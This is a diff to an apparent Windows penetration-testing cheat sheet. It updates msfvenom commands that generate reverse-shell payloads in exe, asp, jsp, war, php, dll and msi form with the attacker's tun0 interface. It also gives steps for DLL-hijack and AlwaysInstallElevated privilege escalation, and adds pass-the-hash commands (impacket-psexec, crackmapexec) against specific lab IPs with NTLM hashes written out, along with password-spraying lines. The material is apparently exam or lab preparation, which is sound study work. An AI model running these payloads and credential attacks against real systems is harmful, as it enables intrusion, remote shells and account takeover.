@@ -1129,13 +1129,13 @@ searchsploit -m windows/remote/46697.py #Copies the exploit to the current locat
 ### Msfvenom
 
 ```powershell
-msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
+msfvenom -p windows/shell/reverse_tcp LHOST=tun0 LPORT=<PORT> -f exe > shell-x86.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=<PORT> -f exe > shell-x64.exe
 
-msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
-msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
+msfvenom -p windows/shell/reverse_tcp LHOST=tun0 LPORT=<PORT> -f asp > shell.asp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=<PORT> -f raw > shell.jsp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=<PORT> -f war > shell.war
+msfvenom -p php/reverse_php LHOST=tun0 LPORT=<PORT> -f raw > shell.php
 ```
 
 ### One Liners
@@ -1294,7 +1294,7 @@ net start <service>
 2. Check whether you have write permissions in the directory associated with the service.
 ```bash
 # Create a reverse-shell
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attaker-IP> LPORT=<listening-port> -f dll > filename.dll
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=<listening-port> -f dll > filename.dll
 ```
 3. Copy it to victom machine and them move it to the service associated directory.(Make sure the dll name is similar to missing name)
 4. Start listener and restart service, you'll get a shell.
@@ -1320,7 +1320,7 @@ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 
 #Creating a reverseshell in msi format
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<port> --platform windows -f msi > reverse.msi
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=<port> --platform windows -f msi > reverse.msi
 
 #Execute and get shell
 msiexec /quiet /qn /i reverse.msi
@@ -1458,6 +1458,9 @@ runas /savecred /user:admin C:\Temp\reverse.exe
 ```bash
 #If hashes are obtained though some means then use psexec, smbexec and obtain the shell as different user.
 pth-winexe -U JEEVES/administrator%aad3b43XXXXXXXX35b51404ee:e0fb1fb857XXXXXXXX238cbe81fe00 //10.129.26.210 cmd.exe
+impacket-psexec 'SVCLIENT73/administrator'@10.11.1.24 -hashes ':ee0c207898a5bccc01f38115019ca2fb'
+#if through proxy
+proxychains -q impacket-psexec Domain_Name/adminWebSvc@WEB05 -hashes ":b0df1cb0819ca0b7d476d4c868175b94"
 ```
 
 ---
@@ -1728,6 +1731,7 @@ grep -inr "cpassword"
 - Crackmapexec
 
 ```bash
+crackmapexec smb 10.11.1.20-24 -u administrator -H 'ee0c207898a5bccc01f38115019ca2fb' --local-auth --lsa
 crackmapexec smb <TARGET[s]> -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -M gpp_password
 crackmapexec smb <TARGET[s]> -u <USERNAME> -H LMHash:NTLMHash -d <DOMAIN> -M gpp_password
 ```
@@ -1870,7 +1874,6 @@ winrs -r:<computername> -u:<user> -p:<password> "command"
 
 ```powershell
 crackmapexec {smb/winrm/mssql/ldap/ftp/ssh/rdp} #supported services
-crackmapexec smb <Rhost/range> -u user.txt -p password.txt --continue-on-success # Bruteforcing attack, smb can be replaced. Shows "Pwned"
 crackmapexec smb <Rhost/range> -u user.txt -p password.txt --continue-on-success | grep '[+]' #grepping the way out!
 crackmapexec smb <Rhost/range> -u user.txt -p 'password' --continue-on-success  #Password spraying, viceversa can also be done
 
